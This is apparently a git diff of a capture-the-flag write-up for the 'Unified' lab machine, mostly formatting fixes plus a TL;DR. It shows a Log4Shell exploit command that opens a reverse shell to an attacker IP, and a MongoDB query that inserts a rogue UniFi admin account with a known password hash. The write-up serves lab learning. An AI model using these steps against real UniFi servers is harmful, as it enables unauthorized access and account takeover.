@@ -3,6 +3,10 @@ layout: default
 title: Unified
 ---
 
+## TL;DR
+
+We get `RCE` using known exploit on `UniFi`. Then we add user to the `mongo-db` server, and logging to the website. There we can find root password inside ssh settings. 
+
 ### Recon
 
 we start as usual with `nmap`, using this command:
@@ -25,17 +29,19 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### Access the webserver and exploit vulnerable version
+
 when accessing the website at port `8080`, we get redirect to port `8443` and can see this page:
 
 ![website login page](image-1.png)
 
-We can search for vulnerabilites of `UniFi 6.4.54`, and we find it vulnerable to log4shell.
-This git repo https://github.com/puzzlepeaches/Log4jUnifi is jumping to me, we can see it has very simple steps in order to achieve reverse shell on this version.
+We can search for vulnerabilities of `UniFi 6.4.54`, and we find it vulnerable to log4shell.
+This git repo [https://github.com/puzzlepeaches/Log4jUnifi](https://github.com/puzzlepeaches/Log4jUnifi) is jumping to me, we can see it has very simple steps in order to achieve reverse shell on this version.
 
 So, let's follow the steps of the manual installation, and then just execute this command:
 ```bash
 python3 exploit.py -u https://$target:8443 -i 10.10.14.162 -p 770
 ```
+
 ![get reverse shell](image-2.png)
 
 Let's get normal shell, this time we can't use the regular spawning of `tty` using python, because it isn't installed on the system. 
@@ -56,7 +62,7 @@ unifi@unified:/usr/lib/unifi$ cat /home/michael/user.txt
 
 ### Privilege escalation
 
-We can follow this article, https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi.
+We can follow this article, [https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi).
 
 Using `ps aux` we can see there is mongo-db that is running on port `27117`
 
@@ -72,7 +78,7 @@ mongo --port 27117 ace
 ```
 
 After connecting, we enumerate all users using this command, we can append db.`forEach(printjson)` at the end, to print it in easier format:
-```
+```bash
 db.admin.find();
 ```
 
@@ -84,7 +90,7 @@ $6$1RTDf1hc/l8EhVG1$8gMEZhJ4kazHKqvbRw5kRdvZCEF48cAXscqt9fxoeE90sFa1p38shYmlWrP.
 ```
 
 And add it to the table, the username will be `elicopter` and password will be `ourSimplePassword`
-```
+```bash
 db.admin.insert({ "email" : "elicopter@localhost.local","last_site_name" : "default", "name" : "elicopter","time_created" : NumberLong(100019800), "x_shadow" :"$6$1RTDf1hc/l8EhVG1$8gMEZhJ4kazHKqvbRw5kRdvZCEF48cAXscqt9fxoeE90sFa1p38shYmlWrP.HLXZ6VDvcD68pP.vQIYCRENYs0" });
 ```
 
